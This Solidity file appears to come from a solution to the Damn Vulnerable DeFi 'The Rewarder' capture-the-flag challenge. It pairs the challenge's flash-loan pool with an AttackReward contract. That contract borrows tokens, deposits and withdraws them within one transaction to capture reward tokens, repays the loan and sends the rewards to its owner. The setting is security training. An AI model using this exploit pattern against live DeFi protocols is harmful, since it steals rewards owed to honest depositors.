// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/security/ReentrancyGuard.sol";
import "@openzeppelin/contracts/utils/Address.sol";
import "../DamnValuableToken.sol";
import "./TheRewarderPool.sol";
import "hardhat/console.sol";

/**
 * @title FlashLoanerPool
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)

 * @dev A simple pool to get flash loans of DVT
 */
contract FlashLoanerPool is ReentrancyGuard {
    using Address for address;

    DamnValuableToken public immutable liquidityToken;

    constructor(address liquidityTokenAddress) {
        liquidityToken = DamnValuableToken(liquidityTokenAddress);
    }

    function flashLoan(uint256 amount) external nonReentrant {
        uint256 balanceBefore = liquidityToken.balanceOf(address(this));
        require(amount <= balanceBefore, "Not enough token balance");

        require(
            msg.sender.isContract(),
            "Borrower must be a deployed contract"
        );

        liquidityToken.transfer(msg.sender, amount);

        msg.sender.functionCall(
            abi.encodeWithSignature("receiveFlashLoan(uint256)", amount)
        );

        require(
            liquidityToken.balanceOf(address(this)) >= balanceBefore,
            "Flash loan not paid back"
        );
    }
}

contract AttackReward {
    FlashLoanerPool pool;
    DamnValuableToken public immutable liquidityToken;
    TheRewarderPool rewardPool;
    address payable owner;

    constructor(
        address poolAddress,
        address liquidityTokenAddress,
        address rewardPoolAddress,
        address payable _owner
    ) {
        pool = FlashLoanerPool(poolAddress);
        liquidityToken = DamnValuableToken(liquidityTokenAddress);
        rewardPool = TheRewarderPool(rewardPoolAddress);
        owner = _owner;
    }

    function attack(uint256 amount) external {
        // 1. get funds
        pool.flashLoan(amount);
    }

    function receiveFlashLoan(uint256 amount) external {
        liquidityToken.approve(address(rewardPool), amount);
        rewardPool.deposit(amount);
        rewardPool.withdraw(amount);
        liquidityToken.transfer(address(pool), amount);

        uint256 currBal = rewardPool.rewardToken().balanceOf(address(this));
        rewardPool.rewardToken().transfer(owner, currBal);
    }

    receive() external payable {}
}
